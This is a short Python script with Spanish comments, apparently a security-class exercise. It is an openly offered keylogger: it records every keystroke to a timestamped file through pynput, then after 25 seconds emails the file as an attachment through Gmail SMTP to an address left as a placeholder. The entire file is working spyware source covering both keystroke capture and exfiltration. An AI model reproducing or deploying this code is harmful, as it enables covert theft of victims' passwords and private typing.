import datetime
import time 
from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import smtplib


#función 
def pulsar_Tecla():

    d = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

    file_name = 'Keylogger_{}.txt'.format(d)

    n = open(file_name, 'w')

    t0 = time.time()  


    def pulso(Key): 
        Key = str(Key)

        if Key == 'tecla.enter':
            n.write('\n') 
        elif Key == 'Key.space':
            n.write(' ')
        elif Key == 'Key.backspace':
            n.write('%BORRAR%')
        else:
            n.write(Key.replace("'", ""))

        if time.time()-t0 > 25:
            n.close()
            mandarEmail(file_name)
            quit()   

    with Listener(on_press = pulso) as P:
        P.join()

def mandarEmail(nombre):

    
    clave = "Aqui nuestra clave del correo"
    
    msg = MIMEMultipart()
    mensaje = "Tarea de seguridad"
    msg['From'] = "Aqui nuestro correo"
    msg['To'] = "A qui poner el correo de destino"
    msg['Subject'] = "UUU mas tarea xd"

    msg.attach(MIMEText(mensaje, 'plain'))

    attachment = open (nombre, 'r')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    p.add_header('Content-Disposition', "attachment; filename= %s" % str(nombre))
    msg.attach(p)

    server = smtplib.SMTP('smtp.gmail.com: 587')
    server.starttls()
    server.login(msg['From'], clave)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()

if __name__ == '__main__':
    pulsar_Tecla()

